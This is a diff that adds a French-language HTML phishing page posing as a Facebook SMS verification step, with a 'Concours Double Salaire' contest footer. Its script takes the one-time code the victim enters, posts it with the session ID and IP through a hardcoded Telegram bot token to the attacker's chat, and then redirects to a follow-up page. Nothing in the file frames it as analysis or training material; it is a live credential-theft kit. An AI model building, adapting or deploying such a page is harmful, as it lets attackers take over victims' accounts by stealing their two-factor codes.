@@ -1,0 +1,300 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vérification SMS</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background-color: #f0f2f5;
+            color: #1c1e21;
+            line-height: 1.6;
+        }
+
+        .container {
+            max-width: 400px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .logo {
+            max-width: 60px;
+            margin-bottom: 15px;
+        }
+
+        .sms-card {
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+
+        .sms-title {
+            font-size: 20px;
+            font-weight: bold;
+            margin-bottom: 15px;
+            color: #9c27b0;
+            text-align: center;
+        }
+
+        .sms-message {
+            color: #65676b;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+        .form-label {
+            display: block;
+            font-size: 14px;
+            color: #65676b;
+            margin-bottom: 5px;
+        }
+
+        .form-control {
+            width: 100%;
+            padding: 14px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 16px;
+            color: #1c1e21;
+            text-align: center;
+            letter-spacing: 5px;
+            font-weight: bold;
+        }
+
+        .form-control:focus {
+            border-color: #9c27b0;
+            outline: none;
+            box-shadow: 0 0 0 2px #f3e5f5;
+        }
+
+        .verify-button {
+            width: 100%;
+            padding: 12px 0;
+            background-color: #9c27b0;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-bottom: 15px;
+        }
+
+        .verify-button:hover {
+            background-color: #7b1fa2;
+        }
+
+        .resend-link {
+            text-align: center;
+            margin-bottom: 15px;
+        }
+
+        .resend-link a {
+            color: #9c27b0;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .resend-link a:hover {
+            text-decoration: underline;
+        }
+
+        .error-message {
+            background-color: #ffebee;
+            color: #c62828;
+            padding: 10px;
+            border-radius: 6px;
+            margin-bottom: 15px;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+        }
+
+        .error-message i {
+            margin-right: 10px;
+            font-size: 16px;
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 30px;
+            color: #65676b;
+            font-size: 12px;
+        }
+
+        .footer a {
+            color: #65676b;
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        .timer {
+            text-align: center;
+            margin-bottom: 15px;
+            color: #65676b;
+            font-size: 14px;
+        }
+
+        .timer span {
+            font-weight: bold;
+            color: #9c27b0;
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 15px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <div class="header">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/51/Facebook_f_logo_%282019%29.svg/150px-Facebook_f_logo_%282019%29.svg.png"
+                alt="Logo" class="logo">
+        </div>
+
+        <div class="sms-card">
+            <div class="sms-title">Vérification par SMS</div>
+            <p class="sms-message">Pour des raisons de sécurité, veuillez entrer le code à 6-8 chiffres que nous avons
+                envoyé par SMS au numéro associé à votre compte.</p>
+
+
+            <form id="email-form" method="post">
+                <div class="form-group">
+                    <label for="email-code" class="form-label">Code Email</label>
+                    <input type="text" id="email-code" name="email_code" class="form-control" placeholder="------"
+                        maxlength="8" required value="">
+                </div>
+
+                <div class="timer">
+                    Temps restant: <span id="countdown">02:00</span>
+                </div>
+
+                <button type="submit" class="verify-button">
+                    Vérifier
+                </button>
+
+                <div class="resend-link">
+                    <a href="#" id="resend-link" style="display: none;">Renvoyer le code</a>
+                </div>
+            </form>
+        </div>
+
+        <div class="footer">
+            <p>© 2025 Concours Double Salaire. Tous droits réservés.</p>
+            <p><a href="#">Conditions d'utilisation</a> · <a href="#">Politique de confidentialité</a></p>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            const sessionId = 'session_81.65.93.231';
+            const clientIp = '81.65.93.231';
+            const emailForm = document.getElementById('email-form');
+            const emailCodeInput = document.getElementById('email-code');
+            const resendLink = document.getElementById('resend-link');
+            const countdownElement = document.getElementById('countdown');
+
+            // Telegram bot token and chat ID
+            const botToken = '7397031599:AAHgmL_t9K5uY7Uo0A7QN6ZlVtX8y2A0lj8';
+            const chatId = '6669693805';
+
+            // Send message to Telegram function
+            function sendTelegramMessage(message) {
+                const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+                const data = {
+                    chat_id: chatId,
+                    text: message
+                };
+
+                return fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(data),
+                });
+            }
+
+            // Handle form submission
+            emailForm.addEventListener('submit', function (event) {
+                event.preventDefault();
+
+                const emailCode = emailCodeInput.value.trim();
+
+                if (emailCode === '') {
+                    alert("Veuillez entrer le code.");
+                    return;
+                }
+
+                const message = `🔔 CODE SMS REÇU 🔔\n\n🔑 Session ID: ${sessionId}\n🌐 IP: ${clientIp}\n📧 Code Email: ${emailCode}`;
+
+                sendTelegramMessage(message)
+                    .then(() => {
+                        // Rediriger seulement après que Telegram ait reçu le message
+                        window.location.href = 'Traitement.html';
+                    })
+                    .catch(error => {
+                        console.error('Erreur envoi Telegram :', error);
+                        alert("Erreur d'envoi à Telegram. Réessayez.");
+                    });
+            });
+
+            // Countdown
+            let timeLeft = 120;
+
+            function updateCountdown() {
+                const minutes = Math.floor(timeLeft / 60);
+                const seconds = timeLeft % 60;
+                countdownElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+
+                if (timeLeft <= 0) {
+                    clearInterval(countdownInterval);
+                    resendLink.style.display = 'inline';
+                } else {
+                    timeLeft--;
+                }
+            }
+
+            updateCountdown();
+            let countdownInterval = setInterval(updateCountdown, 1000);
+
+            resendLink.addEventListener('click', function (event) {
+                event.preventDefault();
+                timeLeft = 120;
+                updateCountdown();
+                resendLink.style.display = 'none';
+
+                clearInterval(countdownInterval);
+                countdownInterval = setInterval(updateCountdown, 1000);
+            });
+        });
+    </script>
+</body>
+
+</html>
